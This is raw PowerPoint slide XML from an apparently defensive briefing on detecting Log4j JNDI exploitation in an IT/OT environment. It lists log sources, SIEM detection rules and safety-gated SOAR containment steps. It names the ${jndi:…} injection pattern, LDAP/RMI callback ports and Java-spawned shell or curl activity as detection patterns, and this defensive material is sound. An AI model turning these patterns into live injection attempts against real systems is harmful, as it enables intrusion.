                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>The ${jndi:…} payload arrives here first — headers and obfuscated forms</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="140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B2430"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>IT–OT boundary firewall &amp; proxy</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="140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400" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="47515F"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Server-initiated egress to LDAP/RMI — a tell an OT box should never make</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="140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r>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1B2430"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>DNS query logs</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="140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47515F"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>JNDI callbacks resolve attacker/canary domains — visible even when encrypted</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="140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B2430"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>OT telemetry (Connect syslog, OPC UA, historian)</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="140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400" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="47515F"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Passive-sensor data where no agent can run — unexpected gateway behaviour</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="140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r>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1B2430"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Endpoint / EDR / Sysmon / auditd</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="140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47515F"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Java spawning a shell or downloader — proof an attempt succeeded</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="140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B2430"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Vuln scan / SBOM inventory</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="140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400" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="47515F"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Which assets actually run vulnerable Log4j — turns an alert into a prioritised one</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="140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B"/>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1C5CAB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>2 · SIEM INSIGHTS</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2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B2430"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>What must it detect — and why</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1600200"/>
            <a:ext cx="11064240" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="47515F"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Layered on purpose: signatures catch the noisy scanning; behaviour catches the quiet attacker who evades the string but still must call out or execute.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2240280"/>
            <a:ext cx="11094415" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9474"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="DDE3EC"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2496312"/>
            <a:ext cx="731520" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2E6FD6"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>I1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1600200" y="2359152"/>
            <a:ext cx="9692640" cy="365760"/>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Inbound JNDI payload (signature)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1600200" y="2697480"/>
            <a:ext cx="9784080" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="47515F"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Detect ${jndi:…} and its encodings in web traffic — catches mass exploitation. ATT&amp;CK T1190</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3227832"/>
            <a:ext cx="11094415" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9474"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="DDE3EC"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3483864"/>
            <a:ext cx="731520" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2E6FD6"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>I2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1600200" y="3346704"/>
            <a:ext cx="9692640" cy="365760"/>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Server-initiated LDAP/RMI egress (behaviour)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1600200" y="3685032"/>
            <a:ext cx="9784080" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="47515F"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>A Java server or gateway calling out to 389/636/1099 — almost never legitimate in OT. T1071 / T1105</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4215384"/>
            <a:ext cx="11094415" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9474"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EAF2FC"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2E6FD6"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4471416"/>
            <a:ext cx="731520" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D14343"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>I3</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1600200" y="4334256"/>
            <a:ext cx="9692640" cy="365760"/>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Correlated payload + callback (high confidence)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1600200" y="4672584"/>
            <a:ext cx="9784080" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="47515F"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Same host receives a payload and then calls out within minutes — two weak signals, one strong alert</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="5202936"/>
            <a:ext cx="11094415" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9474"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="DDE3EC"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5458968"/>
            <a:ext cx="731520" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2E6FD6"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>I4</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1600200" y="5321808"/>
            <a:ext cx="9692640" cy="365760"/>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Suspicious child of Java (post-exploitation)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1600200" y="5660136"/>
            <a:ext cx="9784080" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="47515F"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>java spawning a shell, curl or an unknown binary — the trigger for isolation. T1059</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01826"/>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7FA8E6"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>3 · SIEM ACTIONS</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2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>What must it do — and why</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1691640"/>
            <a:ext cx="11064240" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>In OT, automation is </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EEF3FA"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>safety-gated</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>: block at the IT/OT boundary, never auto-isolate a live controller. A human confirms before anything touches the grid.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2514600"/>
            <a:ext cx="3566160" cy="3200400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2571"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="16233A"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="34405A"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="2743200"/>
            <a:ext cx="3017520" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7FA8E6"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Contain</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="3337560"/>
            <a:ext cx="3063240" cy="2194560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="190500" indent="-190500">
              <a:spcAft>
                <a:spcPts val="700"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>SOAR blocks the source IP at the boundary</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="190500" indent="-190500">
              <a:spcAft>
                <a:spcPts val="700"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Deny the outbound LDAP/RMI callback</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="190500" indent="-190500">
              <a:spcAft>
                <a:spcPts val="700"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Isolate IT hosts; quarantine OT only with operator sign-off</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4315968" y="2514600"/>
            <a:ext cx="3566160" cy="3200400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2571"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="16233A"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="34405A"/>
